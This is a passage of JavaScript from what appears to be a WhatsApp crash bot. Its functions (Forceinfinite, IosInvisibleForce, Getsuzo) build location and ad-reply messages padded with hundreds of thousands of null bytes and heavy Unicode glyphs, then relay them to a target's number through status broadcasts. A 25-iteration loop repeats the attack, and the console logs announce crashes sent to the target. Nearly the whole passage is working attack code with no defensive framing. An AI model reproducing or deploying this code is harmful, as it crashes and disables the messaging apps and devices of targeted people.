      inviteLinkGroupTypeV2: "DEFAULT", 
      contextInfo: {
        externalAdReply: {
          renderLargerThumbnail: true,
          thumbnailUrl: "https://Wa.me/stickerpack/D7eppeli" + "\u0000".repeat(65000) + "ꦾ".repeat(60000),
          sourceUrl: "https://Wa.me/stickerpack/D7eppeli" + "ꦾꦾꦾ".repeat(65600) + "\u0000".repeat(75000) + "ꦾꦾꦾ".repeat(75000),
          showAdAttribution: true,
          body: "🐉",
          title: "I\'ll Never Let U Go Again...\n-( 7-Ydz )" + "ꦾ".repeat(65800) + "\u0000".repeat(85000),
        }, 
        isForwarded: true,
        forwardingScore: 999,
        forwardedNewsletterMessageInfo: {
          newsletterName: "🐉",
          newsletterJid: "13135550002@newsletter",
          serverId:1
        }
      }
    }
  }, { participant: { jid:target } });
  
}

async function Forceinfinite(target) {
  const msg = {
    message: {
      locationMessage: {
        degreesLatitude: 21.1266,
        degreesLongitude: -11.8199,
        name: "~ Getsuzo ¿?" + "\u0000".repeat(70000) + "𑇂𑆵𑆴𑆿".repeat(60000) + "𑇂𑆵𑆴𑆿".repeat(70000),
        url: "https://Wa.me/stickerpack/D7eppeli" + "𑇂𑆵𑆴𑆿".repeat(90000),
        contextInfo: {
          externalAdReply: {
            quotedAd: {
              advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
              mediaType: "IMAGE",
              jpegThumbnail: "https://files.catbox.moe/o7ytw7.jpg",
              caption: "~ Getsuzo" + "𑇂𑆵𑆴𑆿".repeat(8000) + "𑇂𑆵𑆴𑆿".repeat(70000),
            },
            placeholderKey: {
              remoteJid: "0s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key?.id || Math.random().toString(36).slice(2),
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target }
              }
            ]
          }
        ]
      }
    ]
  });
}

async function IosInvisibleForce(target) {
  const msg = {
  message: {
    locationMessage: {
      degreesLatitude: 21.1266,
      degreesLongitude: -11.8199,
      name: "-‣꙱\n" + "\u0000".repeat(900000) + "𑇂𑆵𑆴𑆿".repeat(900000),
      url: "https://Wa.me/stickerpack/D7eppeli",
      contextInfo: {
        externalAdReply: {
          quotedAd: {
            advertiserName: "𑇂𑆵𑆴𑆿".repeat(900000),
            mediaType: "Vaxilon",
            jpegThumbnail: "https://files.catbox.moe/o7ytw7.jpg",
            caption: "~ Getsuzo" + "𑇂𑆵𑆴𑆿".repeat(900000)
          },
          placeholderKey: {
            remoteJid: "0s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          }
        }
      }
    }
  }
};
  
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: {
                  jid: target
                },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
  console.log(randomColor()(`─────「 ⏤!CrashInvisibleIOS To: ${target}!⏤ 」─────`))
}
async function Getsuzo(target) {
   for (let i = 0; i < 25; i++) {
      await NotifCrash(target, ptcp = true)
      await UiAttack(target)
      await uiKiller(target)
   }
}
//=================================================\\
bot.launch();
startSesi();
